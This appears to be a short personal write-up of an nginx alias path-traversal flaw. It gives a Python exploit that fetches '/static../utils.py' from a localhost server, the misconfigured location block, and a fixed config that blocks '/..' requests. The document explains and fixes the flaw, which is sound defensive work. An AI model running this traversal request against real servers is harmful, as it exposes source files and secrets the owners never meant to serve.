#path-traversal #nginx 

## Vulnerability 

exploit.py - directory path traversal 
```bash
#!/usr/bin/env python3

# Modules
import requests

URL = "http://localhost"
FILE = 'utils.py'

def exploit():
    # Get the file
    r = requests.get(f"{URL}/static../{FILE}")

    # Save the file
    with open(f"/tmp/{FILE}", 'wb') as f:
        f.write(r.content)

    print(f"File {FILE} downloaded to /tmp/{FILE}")

if __name__ == "__main__":
    exploit()
```
nginx conf
```
location /static {
	alias /www/application/app/static/;
}
```
## Fix 

```nginx.conf
location /static/ {
    root /www/application/app;
    autoindex off;

    if ($request_uri ~* "/\.\.") {
        return 403;
    }
}
```

![](_attachments/Pasted%20image%2020250322093952.png)